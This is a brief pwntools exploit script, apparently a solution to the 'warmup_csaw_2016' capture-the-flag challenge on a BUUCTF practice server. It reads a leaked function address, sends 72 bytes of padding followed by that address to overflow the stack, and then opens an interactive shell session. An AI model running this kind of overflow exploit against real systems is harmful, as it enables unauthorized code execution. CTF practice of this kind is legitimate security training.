from pwn import * 
io= remote("node3.buuoj.cn",25665)
#io=process("./warmup_csaw_2016")
io.recvuntil(":")
system_addr=int(io.recvuntil("\n",drop=True),16)
payload = cyclic(72)+p64(system_addr)
io.sendline(payload)
io.interactive()




